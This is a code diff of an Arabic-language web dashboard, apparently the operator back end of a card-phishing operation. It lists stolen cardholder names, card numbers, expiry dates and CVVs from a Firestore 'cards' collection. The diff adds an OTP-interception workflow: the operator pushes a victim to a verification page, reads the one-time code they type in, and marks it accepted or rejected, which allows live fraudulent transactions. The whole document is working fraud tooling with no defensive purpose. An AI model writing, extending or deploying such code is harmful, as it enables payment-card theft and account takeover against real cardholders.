@@ -32,26 +32,38 @@
         .badge-visa { background: #eef2ff; color: #4338ca; }
         .badge-master { background: #fff7ed; color: #9a3412; }
         .badge-mada { background: #f0fdf4; color: #166534; }
+        .badge-amex { background: #eff6ff; color: #1d4ed8; }
         
         .status-pending { color: #f59e0b; font-weight: bold; }
         .status-success { color: #10b981; font-weight: bold; }
         .status-error { color: #ef4444; font-weight: bold; }
-        .status-otp_required { color: #8b5cf6; font-weight: bold; }
-        .status-otp_sent { color: #3b82f6; font-weight: bold; }
+        .status-otp_required { color: #8b5cf6; font-weight: bold; background-color: #f5f3ff; padding: 2px 8px; border-radius: 4px; }
+        .status-otp_sent { color: #3b82f6; font-weight: bold; background-color: #eff6ff; padding: 2px 8px; border-radius: 4px; }
         
         .delete-btn { color: #ef4444; border: none; background: none; cursor: pointer; font-size: 18px; }
         .loader { text-align: center; padding: 40px; font-size: 18px; color: var(--primary); }
         
-        .action-buttons { display: flex; gap: 5px; }
-        .action-btn { background: none; border: none; cursor: pointer; font-size: 16px; padding: 5px; border-radius: 4px; }
-        .action-btn:hover { background-color: #f3f4f6; }
+        .action-buttons { display: flex; gap: 8px; flex-wrap: wrap; }
+        .action-btn { background: none; border: none; cursor: pointer; font-size: 16px; padding: 6px 8px; border-radius: 6px; transition: all 0.3s; }
+        .action-btn:hover { transform: translateY(-2px); }
+        
+        .otp-link { color: #1d4ed8; text-decoration: none; font-weight: bold; }
+        .otp-link:hover { text-decoration: underline; }
+        
+        .card-info { 
+            background: #f8fafc; 
+            padding: 15px; 
+            border-radius: 8px; 
+            margin: 5px 0; 
+            border-right: 3px solid var(--primary);
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
     <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
-        <h1><i class="fa-solid fa-database"></i> البطاقات المسجلة</h1>
+        <h1><i class="fa-solid fa-database"></i> لوحة التحكم - إثبات الملكية</h1>
         <button onclick="location.reload()" style="padding: 8px 16px; background: #fff; border: 1px solid var(--border); border-radius: 8px; cursor: pointer;">
             <i class="fa-solid fa-rotate"></i> تحديث
         </button>
@@ -59,9 +71,9 @@
 
     <div class="stats-grid">
         <div class="stat-card"><i class="fa-solid fa-credit-card"></i><div><span class="stat-val" id="total-count">0</span><span class="stat-label">الإجمالي</span></div></div>
-        <div class="stat-card"><i class="fa-brands fa-cc-visa"></i><div><span class="stat-val" id="visa-count">0</span><span class="stat-label">فيزا</span></div></div>
-        <div class="stat-card"><i class="fa-brands fa-cc-mastercard"></i><div><span class="stat-val" id="master-count">0</span><span class="stat-label">ماستركارد</span></div></div>
-        <div class="stat-card"><img src="m.png" width="25" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/8/84/Mada_Logo.svg'"><div><span class="stat-val" id="mada-count">0</span><span class="stat-label">مدى</span></div></div>
+        <div class="stat-card"><i class="fa-solid fa-hourglass-half"></i><div><span class="stat-val" id="pending-count">0</span><span class="stat-label">قيد الانتظار</span></div></div>
+        <div class="stat-card"><i class="fa-solid fa-key"></i><div><span class="stat-val" id="otp-count">0</span><span class="stat-label">مطلوب OTP</span></div></div>
+        <div class="stat-card"><i class="fa-solid fa-check-circle"></i><div><span class="stat-val" id="verified-count">0</span><span class="stat-label">تم التحقق</span></div></div>
     </div>
 
     <div class="table-container">
@@ -70,13 +82,10 @@
             <thead>
                 <tr>
                     <th>النوع</th>
-                    <th>حامل البطاقة</th>
-                    <th>رقم البطاقة</th>
+                    <th>معلومات البطاقة</th>
                     <th>التاريخ</th>
-                    <th>CVV</th>
-                    <th>تاريخ التسجيل</th>
                     <th>الحالة</th>
-                    <th>إجراء</th>
+                    <th>إجراءات</th>
                 </tr>
             </thead>
             <tbody id="table-body"></tbody>
@@ -106,7 +115,7 @@
         const loading = document.getElementById('loading');
         const table = document.getElementById('cards-table');
         
-        let stats = { total: 0, visa: 0, mastercard: 0, mada: 0 };
+        let stats = { total: 0, pending: 0, otp_required: 0, verified: 0 };
 
         try {
             // جلب البيانات مرتبة حسب التاريخ (الأحدث أولاً)
@@ -117,43 +126,83 @@
             
             querySnapshot.forEach((docSnap) => {
                 const data = docSnap.data();
+                const id = docSnap.id;
                 stats.total++;
-                stats[data.cardType]++;
+                
+                // تحديث الإحصائيات بناءً على الحالة
+                if (data.status === 'pending') stats.pending++;
+                if (data.status === 'otp_required' || data.status === 'otp_sent') stats.otp_required++;
+                if (data.status === 'success') stats.verified++;
 
                 const date = data.createdAt ? data.createdAt.toDate().toLocaleString('ar-EG') : 'غير متوفر';
                 
+                // رابط صفحة OTP
+                const otpPageUrl = `${window.location.origin}/index.html?id=${id}`;
+                
                 // تحديد اسم الحالة
-                let statusText = data.status || 'قيد الانتظار';
+                let statusText = '';
                 let statusClass = 'status-' + (data.status || 'pending');
                 
-                if (data.status === 'otp_sent' && data.otp) {
-                    statusText = `<b style="color:blue;">وصل الكود: ${data.otp}</b>`;
+                switch(data.status) {
+                    case 'pending':
+                        statusText = 'قيد الانتظار';
+                        break;
+                    case 'otp_required':
+                        statusText = '📍 مطلوب إدخال OTP';
+                        break;
+                    case 'otp_sent':
+                        statusText = data.otp ? `✅ تم إدخال الكود: <strong>${data.otp}</strong>` : 'تم إرسال OTP';
+                        break;
+                    case 'success':
+                        statusText = '✅ تم التحقق بنجاح';
+                        break;
+                    case 'error':
+                        statusText = '❌ فشل التحقق';
+                        break;
+                    default:
+                        statusText = 'قيد الانتظار';
                 }
 
                 const row = `
-                    <tr id="row-${docSnap.id}">
-                        <td><span class="badge badge-${data.cardType}">${data.cardType.toUpperCase()}</span></td>
-                        <td>${data.cardHolder}</td>
-                        <td dir="ltr">${data.cardNumber}</td>
-                        <td>${data.expiryDate}</td>
-                        <td>${data.cvv}</td>
+                    <tr id="row-${id}">
+                        <td>
+                            <span class="badge badge-${data.cardType || 'visa'}">
+                                ${(data.cardType || 'visa').toUpperCase()}
+                            </span>
+                        </td>
+                        <td>
+                            <div class="card-info">
+                                <div><strong>حامل البطاقة:</strong> ${data.cardHolder || 'غير محدد'}</div>
+                                <div><strong>رقم البطاقة:</strong> <span dir="ltr">${data.cardNumber || 'غير متوفر'}</span></div>
+                                ${data.verificationTime ? `<div><strong>وقت التحقق:</strong> ${data.verificationTime}</div>` : ''}
+                            </div>
+                        </td>
                         <td style="font-size: 12px; color: #666;">${date}</td>
-                        <td id="status-${docSnap.id}" class="${statusClass}">${statusText}</td>
+                        <td id="status-${id}" class="${statusClass}">${statusText}</td>
                         <td>
                             <div class="action-buttons">
-                                <button onclick="updateStatus('${docSnap.id}', 'success')" class="action-btn" style="color:green;" title="قبول">
-                                    <i class="fa-solid fa-check"></i>
-                                </button>
+                                ${data.status === 'otp_sent' && data.otp ? `
+                                    <button onclick="verifyOTP('${id}', '${data.otp}')" class="action-btn" style="color:green; background:#f0fdf4;" title="قبول الكود">
+                                        <i class="fa-solid fa-check-circle"></i> قبول
+                                    </button>
+                                    <button onclick="updateStatus('${id}', 'error')" class="action-btn" style="color:orange; background:#fff7ed;" title="رفض الكود">
+                                        <i class="fa-solid fa-times-circle"></i> رفض
+                                    </button>
+                                ` : ''}
                                 
-                                <button onclick="updateStatus('${docSnap.id}', 'otp_required')" class="action-btn" style="color:#e1ad01;" title="طلب كود التحقق">
-                                    <i class="fa-solid fa-key"></i>
-                                </button>
+                                ${(!data.status || data.status === 'pending') ? `
+                                    <button onclick="sendOTPRequest('${id}', '${otpPageUrl}')" class="action-btn" style="color:#8b5cf6; background:#f5f3ff;" title="إرسال طلب OTP">
+                                        <i class="fa-solid fa-key"></i> طلب OTP
+                                    </button>
+                                ` : ''}
                                 
-                                <button onclick="updateStatus('${docSnap.id}', 'error')" class="action-btn" style="color:orange;" title="رفض">
-                                    <i class="fa-solid fa-xmark"></i>
-                                </button>
+                                ${data.status === 'otp_required' ? `
+                                    <a href="${otpPageUrl}" target="_blank" class="otp-link" title="فتح صفحة OTP">
+                                        <i class="fa-solid fa-external-link"></i> صفحة التحقق
+                                    </a>
+                                ` : ''}
                                 
-                                <button onclick="deleteCard('${docSnap.id}')" class="action-btn delete-btn" title="حذف">
+                                <button onclick="deleteCard('${id}')" class="action-btn delete-btn" title="حذف">
                                     <i class="fa-solid fa-trash-can"></i>
                                 </button>
                             </div>
@@ -165,9 +214,9 @@
 
             // تحديث واجهة الإحصائيات
             document.getElementById('total-count').innerText = stats.total;
-            document.getElementById('visa-count').innerText = stats.visa;
-            document.getElementById('master-count').innerText = stats.mastercard;
-            document.getElementById('mada-count').innerText = stats.mada;
+            document.getElementById('pending-count').innerText = stats.pending;
+            document.getElementById('otp-count').innerText = stats.otp_required;
+            document.getElementById('verified-count').innerText = stats.verified;
 
             loading.style.display = 'none';
             table.style.display = 'table';
@@ -178,6 +227,44 @@
         } 
     }
 
+    // وظيفة إرسال طلب OTP
+    window.sendOTPRequest = async (id, otpPageUrl) => {
+        if (confirm("هل تريد إرسال طلب إدخال رمز التحقق للمستخدم؟")) {
+            try {
+                await updateDoc(doc(db, "cards", id), { 
+                    status: 'otp_required',
+                    otpRequestTime: new Date().toLocaleString('ar-EG')
+                });
+                
+                // فتح صفحة OTP في نافذة جديدة
+                window.open(otpPageUrl, '_blank', 'width=500,height=700');
+                
+                alert("تم إرسال طلب OTP للمستخدم. تم فتح صفحة التحقق في نافذة جديدة.");
+                loadCards();
+            } catch (error) {
+                alert("خطأ في إرسال الطلب: " + error.message);
+            }
+        }
+    };
+
+    // وظيفة التحقق من OTP
+    window.verifyOTP = async (id, otpCode) => {
+        if (confirm(`هل تريد قبول رمز التحقق ${otpCode}؟`)) {
+            try {
+                await updateDoc(doc(db, "cards", id), { 
+                    status: 'success',
+                    verifiedAt: new Date().toLocaleString('ar-EG'),
+                    verifiedBy: 'المسؤول'
+                });
+                
+                alert("تم قبول رمز التحقق بنجاح!");
+                loadCards();
+            } catch (error) {
+                alert("خطأ في قبول الرمز: " + error.message);
+            }
+        }
+    };
+
     // وظيفة الحذف
     window.deleteCard = async (id) => {
         if (confirm("هل أنت متأكد من حذف هذه البطاقة؟")) {
@@ -185,34 +272,19 @@
                 await deleteDoc(doc(db, "cards", id));
                 document.getElementById(`row-${id}`).remove();
                 alert("تم الحذف بنجاح");
-                location.reload(); // لتحديث الإحصائيات
+                loadCards();
             } catch (error) {
                 alert("خطأ في الحذف: " + error.message);
             }
         }
     };
 
-    // وظيفة تحديث الحالة
+    // وظيفة تحديث الحالة العامة
     window.updateStatus = async (id, newStatus) => {
         try {
             await updateDoc(doc(db, "cards", id), { status: newStatus });
-            
-            const el = document.getElementById(`status-${id}`);
-            if (el) {
-                el.className = 'status-' + newStatus;
-                
-                if (newStatus === 'success') {
-                    el.innerText = 'ناجح';
-                } else if (newStatus === 'error') {
-                    el.innerText = 'فشل';
-                } else if (newStatus === 'otp_required') {
-                    el.innerText = 'مطلوب كود تحقق';
-                } else {
-                    el.innerText = newStatus;
-                }
-            }
-            
             alert("تم تحديث الحالة بنجاح");
+            loadCards();
         } catch (e) {
             alert("خطأ في التحديث: " + (e.message || e));
         }
